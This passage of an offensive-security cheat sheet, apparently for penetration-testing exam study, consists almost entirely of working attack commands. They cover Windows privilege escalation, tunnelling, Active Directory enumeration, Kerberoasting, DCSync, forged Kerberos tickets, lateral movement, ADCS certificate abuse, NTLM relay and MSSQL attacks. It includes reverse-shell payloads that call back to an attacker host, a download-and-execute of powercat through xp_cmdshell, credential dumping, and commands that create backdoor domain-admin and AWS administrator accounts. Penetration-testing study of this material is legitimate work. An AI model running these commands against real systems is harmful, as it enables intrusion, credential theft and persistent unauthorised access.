Get-ChildItem -Path C:\Users -Include *.kdbx,*.rdp,*.vnc,*.config -File -Recurse -ErrorAction SilentlyContinue
findstr /si "password" *.xml *.ini *.txt *.config 2>nul
Get-History
(Get-PSReadlineOption).HistorySavePath
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### SeImpersonatePrivilege — Potato Attacks `[win]`
```powershell
whoami /priv   # check for SeImpersonatePrivilege

# GodPotato (works on most modern Windows)
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "cmd /c net user backdoor Pass1234! /add && net localgroup administrators backdoor /add"

# SigmaPotato
.\SigmaPotato.exe "whoami"

# PrintSpoofer
.\PrintSpoofer64.exe -i -c powershell.exe

# JuicyPotatoNG
.\JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c net user backdoor Pass1 /add"
```

### Service Exploitation `[win]`
```powershell
# Unquoted service paths
Get-CimInstance Win32_Service | Where-Object {$_.PathName -and $_.PathName -notmatch '^C:\\Windows\\' -and $_.PathName -notmatch '"'} | Select Name,PathName
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """"

# Weak service permissions (PowerUp)
Get-ModifiableServiceFile
Get-ModifiableService

# Check ACL on service binary
icacls "C:\Program Files\Service\service.exe"

# Replace service binary
copy evil.exe "C:\Program Files\VulnService\service.exe"
Restart-Service VulnService
```

### AlwaysInstallElevated `[win]`
```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Both must be 1
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

### Scheduled Tasks `[win]`
```powershell
schtasks /query /fo LIST /v | findstr /i "task name\|run as\|status\|next run\|task to run"
Get-ScheduledTask | Where-Object {$_.Principal.RunLevel -eq "HighestAvailable"}
# Check if action file is writable → replace it
icacls "C:\path\to\task_action.exe"
```

### DLL Hijacking `[win]`
```powershell
# Use Process Monitor (ProcMon) to find "NAME NOT FOUND" DLL loads in writable dirs
# Compile malicious DLL (cross-compile or MSVC):
# evil.c → add DllMain that calls system() → compile as DLL → place in search path
x86_64-w64-mingw32-gcc -shared -o evil.dll evil.c
```

### UAC Bypass `[win]`
```powershell
# Check integrity level
Import-Module NtObjectManager
Get-NtTokenIntegrityLevel

# MSF module
use exploit/windows/local/bypassuac_sdclt
# Targets sdclt.exe — spawns High integrity shell
```

---

## 12. Port Forwarding & Tunneling

> **Concept:** Pivoting lets you reach internal networks through a compromised host. Key tools: SSH (port forward/SOCKS proxy), Chisel (HTTP tunnel), socat (port redirect), Proxychains (force traffic through SOCKS). Always map the network topology first: `ip a`, `ip route`, `arp -a`.

### Socat Port Forward (Linux pivot)
```bash
# On compromised Linux host — forward local port → internal target
socat -ddd TCP-LISTEN:<LOCAL_PORT>,fork TCP:<INTERNAL_IP>:<INTERNAL_PORT>
# Example: expose internal DB (10.10.10.5:5432) on pivot:2345
socat TCP-LISTEN:2345,fork TCP:10.10.10.5:5432
```

### SSH Local Port Forward
```bash
# Expose internal port through SSH tunnel to Kali
ssh -N -L <LOCAL_PORT>:<DEST_IP>:<DEST_PORT> <USER>@<PIVOT_IP>
# Example: access RDP on internal host via Kali:13389
ssh -N -L 13389:10.10.10.10:3389 user@192.168.1.50
xfreerdp /v:127.0.0.1:13389 /u:<USER> /p:<PASS>
```

### SSH Dynamic Port Forward (SOCKS Proxy)
```bash
# Creates SOCKS5 proxy on Kali → route traffic to any host reachable from pivot
ssh -N -D 9050 <USER>@<PIVOT_IP>
# Configure /etc/proxychains4.conf: socks5 127.0.0.1 9050
proxychains nmap -sT -Pn -n <INTERNAL_IP>
proxychains curl http://<INTERNAL_IP>/
```

### SSH Remote Port Forward (connect back through firewall)
```bash
# On Kali: enable SSH server
sudo systemctl start ssh

# On pivot (compromised host):
ssh -N -R 127.0.0.1:<KALI_PORT>:<DEST_IP>:<DEST_PORT> kali@<KALI_IP>
# Example: expose internal PostgreSQL on Kali:2345
ssh -N -R 127.0.0.1:2345:10.10.10.5:5432 kali@<KALI_IP>
# Now: psql -h 127.0.0.1 -p 2345 -U postgres  (from Kali)
```

### Chisel (HTTP Tunnel — bypasses firewalls)
```bash
# Kali: start server
chisel server --port 8080 --reverse

# Pivot: connect to Kali
./chisel client <KALI_IP>:8080 R:socks     # SOCKS proxy on Kali:1080
./chisel client <KALI_IP>:8080 R:<KALI_PORT>:<INTERNAL_IP>:<PORT>  # specific port

# Use with proxychains (socks5 127.0.0.1 1080)
proxychains netexec smb <INTERNAL_IP> -u admin -p pass
```

### Plink (Windows SSH client)
```powershell
# Download from Kali
powershell wget -Uri http://<KALI_IP>/plink.exe -OutFile C:\Temp\plink.exe
# Remote port forward to expose Windows RDP
C:\Temp\plink.exe -ssh -l kali -pw <PASS> -R 127.0.0.1:9833:127.0.0.1:3389 <KALI_IP>
# Connect from Kali
xfreerdp /v:127.0.0.1:9833 /u:<USER> /p:<PASS>
```

### Netsh Port Proxy (Windows, requires admin)
```cmd
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=0.0.0.0 connectport=22 connectaddress=<INTERNAL_IP>
netsh advfirewall firewall add rule name="fwd_ssh" protocol=TCP dir=in localport=2222 action=allow
netsh interface portproxy show all
# Cleanup:
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=0.0.0.0
netsh advfirewall firewall delete rule name="fwd_ssh"
```

### Proxychains Configuration
```bash
# /etc/proxychains4.conf — replace proxy line at bottom:
socks5  127.0.0.1  1080      # for Chisel / SSH SOCKS
socks5  127.0.0.1  9050      # for Tor / alternative

# Lower timeouts for faster scanning:
tcp_read_time_out 800
tcp_connect_time_out 800

# Usage:
proxychains -q nmap -sT -Pn -n --top-ports 20 <INTERNAL_IP>
```

### DNS Tunneling (dnscat2)
```bash
# Kali: start server (authoritative for a domain)
dnscat2-server feline.corp

# Victim: connect
./dnscat feline.corp

# From dnscat2 server session:
windows
window -i 1
listen 127.0.0.1:4455 <INTERNAL_IP>:445    # port forward through DNS tunnel
```

---

## 13. Active Directory Enumeration

> **Concept:** AD enumeration relies on LDAP queries. Use RDP where possible to avoid the Kerberos Double Hop problem with WinRM. BloodHound + SharpHound provide the most comprehensive attack path analysis.

### Basic Net Commands `[win]`
```cmd
net user /domain
net user <USER> /domain
net group /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
net accounts /domain          # password policy, lockout threshold
```

### PowerView (PowerSploit) `[win]`
```powershell
powershell -ep bypass
Import-Module .\PowerView.ps1

# Users & Groups
Get-DomainUser | select samaccountname, description, memberof, pwdlastset
Get-DomainGroup | select name
Get-DomainGroupMember "Domain Admins" | select MemberName
Get-DomainComputer | select name, operatingsystem, dnshostname

# Find logged-on users
Get-NetLoggedon -ComputerName <HOST>
Get-NetSession -ComputerName <DC>
.\PsLoggedon.exe \\<HOST>

# SPNs (Kerberoastable accounts)
Get-DomainUser -SPN | select samaccountname,serviceprincipalname
Get-NetUser -SPN | select samaccountname,serviceprincipalname

# ACL enumeration
Get-ObjectAcl -Identity <USER>
Get-ObjectAcl -Identity "Domain Admins" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
Convert-SidToName <SID>

# Shares
Find-DomainShare
Find-DomainShare -CheckShareAccess

# GPP passwords in SYSVOL
Get-GPPPassword     # PowerView or check SYSVOL manually
gpp-decrypt "<encrypted_string>"   # Kali
```

### SharpHound + BloodHound
```powershell
# Collect data
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Temp\ -OutputPrefix "audit"
# Or: .\SharpHound.exe -c All

# Transfer ZIP to Kali, then:
sudo neo4j start
bloodhound
# Import ZIP → Analyze → "Find Shortest Paths to Domain Admins"
# Mark owned principals → re-run "Shortest Paths from Owned Principals"
```

### LDAP Enumeration from Linux
```bash
# ldapsearch
ldapsearch -x -H ldap://<DC_IP> -b "DC=corp,DC=com" "(objectClass=user)" sAMAccountName
ldapsearch -x -H ldap://<DC_IP> -D "<USER>@corp.com" -w <PASS> -b "DC=corp,DC=com" "(objectClass=user)"

# NetExec LDAP
netexec ldap <DC_IP> -u <USER> -p <PASS> --users
netexec ldap <DC_IP> -u <USER> -p <PASS> --groups
netexec ldap <DC_IP> -u <USER> -p <PASS> --password-not-required   # ASREPRoast targets
netexec ldap <DC_IP> -u <USER> -p <PASS> --bloodhound -c All       # run bloodhound collection

# impacket
impacket-GetADUsers -all corp.com/<USER>:<PASS> -dc-ip <DC_IP>
```

---

## 14. Active Directory Authentication Attacks

> **Concept:** Kerberoast = crack TGS tickets for service accounts (no special privs needed). ASREPRoast = crack AS-REP for accounts with pre-auth disabled. DCSync = impersonate DC to pull all hashes. Silver Ticket = forge TGS for specific service. Golden Ticket = forge TGT for any service.

### Kerberoasting
```bash
# Linux (valid domain creds required)
impacket-GetUserSPNs corp.com/<USER>:<PASS> -dc-ip <DC_IP> -request -outputfile hashes.kerberoast

# Windows
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast /nowrap
# PowerView only:
$spns = Get-DomainUser -SPN; Request-SPNTicket -SPN $spns[0].serviceprincipalname

# Crack
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### AS-REP Roasting
```bash
# Linux — enumerate accounts first
impacket-GetNPUsers corp.com/ -usersfile users.txt -dc-ip <DC_IP> -no-pass -format hashcat
impacket-GetNPUsers corp.com/<USER>:<PASS> -dc-ip <DC_IP> -request -outputfile asrep.hash

# Windows
.\Rubeus.exe asreproast /nowrap
netexec ldap <DC_IP> -u <USER> -p <PASS> --asreproast asrep.txt

# Crack
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

### DCSync (requires DA or Replicating Directory Changes rights)
```
# Mimikatz on DC / DA context
lsadump::dcsync /user:Administrator
lsadump::dcsync /domain:corp.com /all /csv

# Linux
impacket-secretsdump corp.com/<USER>:<PASS>@<DC_IP> -just-dc
impacket-secretsdump corp.com/<USER>:<PASS>@<DC_IP> -just-dc-user Administrator
```

### Silver Ticket
```
# Need: SPN NTLM hash, domain SID, target SPN
privilege::debug
sekurlsa::logonpasswords        # get service account hash
whoami /user                    # get domain SID (remove last RID)

kerberos::golden /sid:<DOMAIN_SID> /domain:corp.com /ptt \
  /target:web04.corp.com /service:http \
  /rc4:<NTLM_HASH> /user:Administrator
klist   # verify ticket
```

### Golden Ticket
```
# Need: krbtgt NTLM hash, domain SID (from lsadump::lsa on DC)
privilege::debug
lsadump::lsa /patch              # on DC only

kerberos::purge
kerberos::golden /user:Administrator /domain:corp.com \
  /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt
misc::cmd
PsExec.exe \\dc1 cmd.exe
```

### Credential Guard Check & Bypass `[win]`
```powershell
Get-ComputerInfo | Select-Object -Property DeviceGuard*
# If enabled: local account hashes still retrievable; domain hashes protected

# Inject malicious SSP to capture plaintext at authentication time
privilege::debug
misc::memssp
# Wait for logon → check: C:\Windows\System32\mimilsa.log
```

---

## 15. Active Directory Lateral Movement

> **Concept:** Move between hosts using valid credentials, hashes, or tickets. WMI/WinRM require admin-group membership. PsExec requires ADMIN$ share and File/Printer Sharing. Always check if SMB/WMI ports are accessible before attempting.

### WMI Execution `[win]`
```powershell
# CMD
wmic /node:<TARGET_IP> /user:<USER> /password:<PASS> process call create "powershell -enc <b64>"

# PowerShell CIM (stealthier — uses DCOM)
$cred = New-Object System.Management.Automation.PSCredential('<USER>', (ConvertTo-SecureString '<PASS>' -AsPlaintext -Force))
$opts = New-CimSessionOption -Protocol DCOM
$sess = New-CimSession -ComputerName <TARGET_IP> -Credential $cred -SessionOption $opts
Invoke-CimMethod -CimSession $sess -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='powershell -enc <b64>'}
```

### WinRM / PowerShell Remoting `[win]`
```powershell
# winrs
winrs -r:<TARGET> -u:<USER> -p:<PASS> "cmd /c whoami"

# PSSession
$cred = Get-Credential
New-PSSession -ComputerName <TARGET> -Credential $cred
Enter-PSSession 1
Invoke-Command -ComputerName <TARGET> -Credential $cred -ScriptBlock {whoami}
```

### PsExec `[win]`
```powershell
.\PsExec64.exe -i \\<TARGET> -u corp\<USER> -p <PASS> cmd
.\PsExec64.exe \\<TARGET> cmd    # if already have TGT via overpass-the-hash
```

### NetExec Lateral Movement (Linux)
```bash
netexec smb <IP> -u <USER> -p <PASS> -x "whoami"
netexec smb <IP> -u <USER> -p <PASS> --exec-method smbexec -x "whoami"
netexec winrm <IP> -u <USER> -p <PASS> -x "whoami"
```

### Pass the Hash (Impacket)
```bash
impacket-psexec -hashes :<NTHASH> <USER>@<IP>
impacket-wmiexec -hashes :<NTHASH> <USER>@<IP>
impacket-smbexec -hashes :<NTHASH> <USER>@<IP>
impacket-atexec -hashes :<NTHASH> <USER>@<IP> "whoami"

# Evil-WinRM (interactive)
evil-winrm -i <IP> -u <USER> -H <NTHASH>
evil-winrm -i <IP> -u <USER> -p <PASS>
```

### Overpass the Hash `[win]`
```
# Convert NTLM hash → Kerberos TGT
sekurlsa::pth /user:<USER> /domain:corp.com /ntlm:<NTHASH> /run:powershell
# In new PS window:
net use \\<TARGET>        # force TGT generation
klist                     # confirm TGT
.\PsExec.exe \\<TARGET> cmd
```

### Pass the Ticket `[win]`
```
privilege::debug
sekurlsa::tickets /export    # export all .kirbi from memory
dir *.kirbi
# Inject specific ticket:
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
klist
# Now access resource as ticket owner:
ls \\web04\restricted_share
```

### DCOM Lateral Movement `[win]`
```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<TARGET_IP>"))
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -enc <b64>","7")
```

---

## 16. Active Directory Persistence

### Shadow Copy (NTDS Extraction) `[win]`
```cmd
# On DC (DA required)
vshadow.exe -nw -p C:
# Copy NTDS from shadow copy:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
reg.exe save hklm\system c:\system.bak
# Transfer .bak files to Kali, then:
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

### DCSync Persistence
```bash
# Kali — dump all hashes
impacket-secretsdump corp.com/<DA_USER>:<PASS>@<DC_IP>
```

### Golden Ticket Persistence
```
# krbtgt hash doesn't auto-rotate → valid for domain functional level lifetime
# Forge TGT anytime with stored krbtgt hash + domain SID
kerberos::golden /user:backdoor /domain:corp.com /sid:<SID> /krbtgt:<KRBTGT_HASH> /ptt
```

### Backdoor Account
```bash
# AWS / general
aws iam create-user --user-name backdoor
aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name backdoor

# Windows AD
net user backdoor P@ssw0rd123! /add /domain
net group "Domain Admins" backdoor /add /domain
```


---

## 17. ADCS — Active Directory Certificate Services

> **Concept:** ADCS is one of the most impactful modern AD attack surfaces. Misconfigured certificate templates allow low-privileged users to request certificates that enable authentication as any domain user, including Domain Admins. The tool `Certipy` (Linux) and `Certify` (Windows) are the standard tools. ESC1–ESC8 are the core escalation paths — ESC1 and ESC3 are the most commonly found in real assessments.

### Enumerate with Certipy (Linux)
```bash
# Install
pip3 install certipy-ad

# Find vulnerable templates
certipy find -u <USER>@corp.com -p <PASS> -dc-ip <DC_IP>
certipy find -u <USER>@corp.com -p <PASS> -dc-ip <DC_IP> -vulnerable -stdout

# Full BloodHound-compatible output
certipy find -u <USER>@corp.com -p <PASS> -dc-ip <DC_IP> -bloodhound
```

### Enumerate with Certify (Windows)
```powershell
# Find all vulnerable templates
.\Certify.exe find /vulnerable
.\Certify.exe find /vulnerable /currentuser

# List all CAs
.\Certify.exe cas
```

### ESC1 — Misconfigured Template (SAN + Client Auth)
> **When:** Template allows requestor to specify Subject Alternative Name (SAN) AND has Client Authentication EKU. Anyone enrolled can request a cert as any user.
```bash
# Linux — request cert as DA
certipy req -u <USER>@corp.com -p <PASS> -dc-ip <DC_IP> \
  -target <CA_HOST> -ca <CA_NAME> -template <VULN_TEMPLATE> \
  -upn administrator@corp.com

# Authenticate with the cert → get NTLM hash / TGT
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
# → dumps NTLM hash + TGT for administrator

# Windows — request cert
.\Certify.exe request /ca:<CA_HOST>\<CA_NAME> /template:<TEMPLATE> /altname:administrator
# Convert .pem → .pfx then use Rubeus
.\Rubeus.exe asktgt /user:administrator /certificate:<base64_pfx> /password:abc /ptt
```

### ESC3 — Enrollment Agent Abuse
> **When:** A template grants Certificate Request Agent rights. Attacker enrolls as agent, then requests a cert on behalf of any user.
```bash
# Step 1: Get enrollment agent cert
certipy req -u <USER>@corp.com -p <PASS> -dc-ip <DC_IP> \
  -target <CA_HOST> -ca <CA_NAME> -template <AGENT_TEMPLATE>

# Step 2: Use agent cert to request on-behalf-of DA
certipy req -u <USER>@corp.com -p <PASS> -dc-ip <DC_IP> \
  -target <CA_HOST> -ca <CA_NAME> -template User \
  -on-behalf-of corp\\administrator -pfx agent.pfx

# Authenticate
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

### ESC4 — Writable Template ACL
> **When:** User has write access over a certificate template object in AD — modify it to become ESC1.
```bash
# Overwrite template to be vulnerable (saves original)
certipy template -u <USER>@corp.com -p <PASS> -dc-ip <DC_IP> \
  -template <TEMPLATE_NAME> -save-old

# Now exploit as ESC1
certipy req -u <USER>@corp.com -p <PASS> -dc-ip <DC_IP> \
  -target <CA_HOST> -ca <CA_NAME> -template <TEMPLATE_NAME> \
  -upn administrator@corp.com

# Restore original template
certipy template -u <USER>@corp.com -p <PASS> -dc-ip <DC_IP> \
  -template <TEMPLATE_NAME> -configuration <TEMPLATE_NAME>.json
```

### ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 CA Flag
> **When:** CA is configured with the EDITF_ATTRIBUTESUBJECTALTNAME2 flag — allows SAN in any template request.
```bash
# Any template becomes ESC1-like
certipy req -u <USER>@corp.com -p <PASS> -dc-ip <DC_IP> \
  -target <CA_HOST> -ca <CA_NAME> -template User \
  -upn administrator@corp.com
```

### ESC8 — NTLM Relay to AD CS HTTP Endpoint
> **When:** CA has web enrollment enabled (HTTP). Relay NTLM auth from a DC machine account to the CA web endpoint to get a DC certificate → DCSync.
```bash
# Step 1: Start relay targeting the CA web enrollment
impacket-ntlmrelayx -t http://<CA_HOST>/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# Step 2: Coerce DC auth (PetitPotam / Coercer)
python3 PetitPotam.py -u <USER> -p <PASS> <LHOST> <DC_IP>

# Step 3: Use the b64 cert from ntlmrelayx output
certipy auth -pfx dc.pfx -dc-ip <DC_IP>
# → DC machine account hash → DCSync
```

### Post-Cert Authentication
```bash
# Get TGT from PFX
certipy auth -pfx <user>.pfx -dc-ip <DC_IP>

# Pass-the-Hash with the extracted NT hash
impacket-secretsdump -hashes :<NTHASH> corp.com/<USER>@<DC_IP>
impacket-psexec -hashes :<NTHASH> administrator@<DC_IP>

# Convert PFX for use with Rubeus [win]
.\Rubeus.exe asktgt /user:<USER> /certificate:<b64pfx> /password:<pfxpass> /ptt
```

---

## 18. AD Delegation Attacks

> **Concept:** Delegation allows a service to impersonate users to access other services. Misconfigured delegation is a common high-impact finding. Three types: Unconstrained (most dangerous), Constrained, and Resource-Based Constrained Delegation (RBCD). `bloodyAD` provides most of these attacks from Linux without needing Windows tooling.

### Unconstrained Delegation

> **When:** A computer/service account has `TrustedForDelegation` set. Any TGT sent to that service is cached in memory — if you coerce a DC to authenticate to it, you get the DC's TGT → DCSync.

```bash
# Find unconstrained delegation accounts (Linux)
impacket-findDelegation corp.com/<USER>:<PASS> -dc-ip <DC_IP>

# Find unconstrained delegation [win]
Get-DomainComputer -Unconstrained | select name,dnshostname
Get-DomainUser -Unconstrained | select samaccountname

# Step 1: Compromise the unconstrained host, then monitor for TGTs
.\Rubeus.exe monitor /interval:5 /nowrap

# Step 2: Coerce DC auth to the unconstrained host
python3 PetitPotam.py -u <USER> -p <PASS> <UNCONSTRAINED_HOST_IP> <DC_IP>
# or
python3 Coercer.py coerce -u <USER> -p <PASS> -d corp.com \
  -l <UNCONSTRAINED_HOST_IP> -t <DC_IP>

# Step 3: Rubeus captures DC TGT — inject it
.\Rubeus.exe ptt /ticket:<base64_ticket>

# Step 4: DCSync
impacket-secretsdump corp.com/<USER>@<DC_IP> -k -no-pass
```

### Constrained Delegation

> **When:** Account has `msDS-AllowedToDelegateTo` set — can impersonate any user to specific services. If S4U2Self is available, can escalate to DA.

```bash
# Find constrained delegation accounts
impacket-findDelegation corp.com/<USER>:<PASS> -dc-ip <DC_IP>

# [win] PowerView
Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto

# Request impersonation ticket (S4U2Proxy) [win]
.\Rubeus.exe s4u /user:<DELEG_USER> /rc4:<NTHASH> \
  /impersonateuser:administrator \
  /msdsspn:<SPN_TO_DELEGATE_TO> /ptt

# Linux — getST (impacket)
impacket-getST -spn cifs/<TARGET_HOST> corp.com/<DELEG_USER> \
  -hashes :<NTHASH> -impersonate administrator -dc-ip <DC_IP>
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass corp.com/administrator@<TARGET_HOST>
```

### Resource-Based Constrained Delegation (RBCD)

> **When:** You have `GenericWrite` or `GenericAll` over a computer object. Write your controlled machine account into the target's `msDS-AllowedToActOnBehalfOfOtherIdentity` → then impersonate any user to that machine.

```bash
# Step 1: Need a machine account (or create one — default quota = 10 per user)
# Linux — add machine account
impacket-addcomputer corp.com/<USER>:<PASS> -dc-ip <DC_IP> \
  -computer-name EVILPC$ -computer-pass EvilPass123!

# Step 2: Set RBCD — write our machine account into target's attribute
# Linux — bloodyAD
bloodyAD -u <USER> -p <PASS> -d corp.com --host <DC_IP> \
  set object <TARGET_COMPUTER$> msDS-AllowedToActOnBehalfOfOtherIdentity \
  --value 'EVILPC$'

# [win] PowerView
$sid = (Get-DomainComputer EVILPC).objectsid
$sd = New-Object Security.AccessControl.RawSecurityDescriptor \
  "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
$sdbytes = New-Object byte[] ($sd.BinaryLength)
$sd.GetBinaryForm($sdbytes, 0)
Set-DomainObject -Identity <TARGET_COMPUTER$> \
  -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sdbytes}

# Step 3: Request service ticket impersonating DA
impacket-getST -spn cifs/<TARGET_HOST> corp.com/EVILPC$ \
  -hashes :<MACHINE_NTHASH> -impersonate administrator -dc-ip <DC_IP>

# Step 4: Use the ticket
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass corp.com/administrator@<TARGET_HOST>
```

### bloodyAD — Linux AD Swiss Army Knife
```bash
pip3 install bloodyAD

# Enumerate
bloodyAD -u <USER> -p <PASS> -d corp.com --host <DC_IP> get object <USER> --attr memberOf
bloodyAD -u <USER> -p <PASS> -d corp.com --host <DC_IP> get children "DC=corp,DC=com" --type user
bloodyAD -u <USER> -p <PASS> -d corp.com --host <DC_IP> get object <TARGET> --attr msDS-AllowedToActOnBehalfOfOtherIdentity

# Privilege abuse
bloodyAD -u <USER> -p <PASS> -d corp.com --host <DC_IP> \
  set password <TARGET_USER> 'NewPass123!'   # if GenericAll/ForceChangePassword
bloodyAD -u <USER> -p <PASS> -d corp.com --host <DC_IP> \
  add groupMember "Domain Admins" <USER>     # if GenericAll on group
```

### LAPS (Local Administrator Password Solution)
```bash
# Check if LAPS is deployed
Get-DomainComputer | Where-Object {$_."ms-mcs-admpwdexpirationtime" -ne $null} | select name

# Read LAPS passwords (requires delegated read rights)
Get-DomainComputer -Identity <HOSTNAME> -Properties ms-mcs-admpwd
netexec ldap <DC_IP> -u <USER> -p <PASS> --laps         # Linux
netexec smb <IP> -u <USER> -p <PASS> --laps             # connect with LAPS pass

# bloodyAD
bloodyAD -u <USER> -p <PASS> -d corp.com --host <DC_IP> \
  get object <COMPUTER$> --attr ms-mcs-admpwd
```

---

## 19. IPv6 & Coercion Attacks

> **Concept:** Most internal networks have IPv6 enabled but no DHCPv6 server. `mitm6` poisons DHCPv6 to become the DNS server for IPv6, redirecting authentication to your machine. Combined with `ntlmrelayx`, this is extremely effective for obtaining machine account hashes and domain privilege escalation — it works in virtually every default Windows domain environment.

### mitm6 + ntlmrelayx (IPv6 DNS Poisoning + NTLM Relay)
```bash
# Install
pip3 install mitm6

# Step 1: Start ntlmrelayx targeting DCs or other servers
# Relay to LDAP → dump domain info / create computer accounts
sudo impacket-ntlmrelayx -6 -t ldaps://<DC_IP> -wh fakewpad.corp.com \
  -l /tmp/loot --delegate-access --remove-mic

# Relay to SMB → exec commands (UAC restrictions apply)
sudo impacket-ntlmrelayx -6 -t smb://<TARGET_IP> -wh fakewpad.corp.com \
  -c "powershell -enc <b64>" --smb2support

# Step 2: Start mitm6 (separate terminal, run as root)
sudo mitm6 -d corp.com

# → Wait for machines to reboot / re-authenticate
# → Machine account credentials relay into LDAP → RBCD setup
# → Then exploit RBCD as shown in Section 18
```

### Coercion Attacks

> **Concept:** Force a target (especially a Domain Controller) to authenticate outbound to your machine using various Windows protocols. Combine with Responder or ntlmrelayx to capture/relay the hash. PetitPotam and Coercer are the most reliable modern tools.

```bash
# Install Coercer
pip3 install coercer

# Scan what coercion methods are available
coercer scan -t <DC_IP> -u <USER> -p <PASS> -d corp.com

# Coerce authentication to your listener
coercer coerce -t <DC_IP> -l <LHOST> -u <USER> -p <PASS> -d corp.com

# PetitPotam (EfsRPC coercion — works unauthenticated on older systems)
python3 PetitPotam.py <LHOST> <DC_IP>
python3 PetitPotam.py -u <USER> -p <PASS> -d corp.com <LHOST> <DC_IP>

# PrinterBug / SpoolSample (requires auth)
python3 printerbug.py corp.com/<USER>:<PASS>@<DC_IP> <LHOST>
```

### Responder (Capture Hashes on the Wire)
```bash
sudo responder -I eth0 -wdF        # aggressive mode (WPAD + DHCP)
sudo responder -I eth0 -v          # standard
# Hashes saved to /usr/share/responder/logs/

# Crack captured Net-NTLMv2
hashcat -m 5600 /usr/share/responder/logs/*.txt /usr/share/wordlists/rockyou.txt
```

### NTLM Relay Cheatsheet
```bash
# Relay to SMB (code exec — requires local admin, UAC restrictions)
impacket-ntlmrelayx -t smb://<TARGET> --smb2support -c "whoami"

# Relay to LDAP (dump info, add users, RBCD — no UAC restriction)
impacket-ntlmrelayx -t ldap://<DC_IP> --no-smb-server -wh attacker-wpad

# Relay to LDAPS (requires LDAP signing disabled — default)
impacket-ntlmrelayx -t ldaps://<DC_IP> --delegate-access

# Relay to ADCS HTTP enrollment (ESC8)
impacket-ntlmrelayx -t http://<CA_HOST>/certsrv/certfnsh.asp \
  --adcs --template DomainController

# Multi-target relay from file
impacket-ntlmrelayx -tf targets.txt --smb2support
```

---

## 20. MSSQL Attacks

> **Concept:** MSSQL servers are frequently found with excessive privileges, linked servers, or running as high-privileged service accounts. `xp_cmdshell` provides OS command execution. Linked servers can chain laterally across multiple SQL instances — even across domains.

### Connect & Enumerate
```bash
# Linux — impacket (NTLM or Kerberos)
impacket-mssqlclient <USER>:<PASS>@<IP> -windows-auth
impacket-mssqlclient -k corp.com/<USER>@<MSSQL_HOST> -no-pass   # Kerberos

# Enumerate instance info
SELECT @@version;
SELECT @@servername;
SELECT name FROM sys.databases;
SELECT name, is_disabled FROM sys.sql_logins;

# Check current user and role
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');    -- 1 = yes
```

### Enable xp_cmdshell
```sql
-- Enable advanced options
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute OS commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -enc <b64>';

-- Reverse shell via xp_cmdshell
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://<LHOST>/powercat.ps1'');powercat -c <LHOST> -p <LPORT> -e powershell"';
```

### Linked Server Lateral Movement
```sql
-- Enumerate linked servers
SELECT name, provider, data_source FROM sys.servers WHERE is_linked = 1;
EXEC sp_linkedservers;

-- Execute on linked server
EXEC ('SELECT SYSTEM_USER') AT [<LINKED_SERVER>];
EXEC ('EXEC xp_cmdshell ''whoami''') AT [<LINKED_SERVER>];

-- Chain through multiple links
EXEC ('EXEC (''SELECT SYSTEM_USER'') AT [<SERVER2>]') AT [<SERVER1>];

-- If linked server has sysadmin via different account → enable xp_cmdshell there
EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;
       EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [<LINKED_SERVER>];
```

### UNC Path Injection (Hash Capture)
```sql
-- Trigger NTLM auth to Responder/ntlmrelayx
EXEC xp_dirtree '\\<LHOST>\share';
EXEC master..xp_fileexist '\\<LHOST>\share\file';
```

### MSSQL Privilege Escalation — Impersonation
```sql
-- Find who can be impersonated
SELECT distinct b.name FROM sys.database_permissions a
  INNER JOIN sys.database_principals b ON a.grantor_principal_id = b.principal_id
  WHERE a.permission_name = 'IMPERSONATE';

-- Impersonate and escalate
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
